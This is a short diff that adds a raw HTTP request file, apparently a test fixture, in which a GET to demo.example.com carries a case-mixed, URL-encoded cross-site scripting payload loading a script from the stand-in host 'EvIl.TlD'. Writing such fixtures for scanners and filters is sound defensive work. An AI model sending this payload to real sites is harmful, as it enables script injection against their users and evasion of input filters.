@@ -1,0 +1,4 @@
+GET /a?input=<sCrIpT%20sRc%3D//EvIl.TlD/x.Js></ScRiPt> HTTP/1.1
+Host: demo.example.com
+Connection: close
+
